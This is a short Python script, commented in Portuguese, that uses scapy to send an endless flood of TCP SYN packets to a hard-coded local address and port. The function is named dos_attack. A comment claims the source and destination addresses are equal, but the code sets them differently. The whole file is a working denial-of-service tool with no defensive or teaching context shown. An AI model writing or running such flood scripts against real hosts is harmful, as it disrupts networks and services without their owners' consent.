from scapy.all import *
from scapy.layers.inet import IP, TCP
import time

target_ip = "192.168.1.168"  # Exemplo: "192.168.0.110"
target_port = 44444

def dos_attack():
    while True:
        ip = IP(src="192.168.1.140", dst=target_ip)  # src e dst iguais
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        pkt = ip/tcp
        send(pkt, verbose=False)
        print(f"Enviado pacote para {target_ip}:{target_port}")

dos_attack()
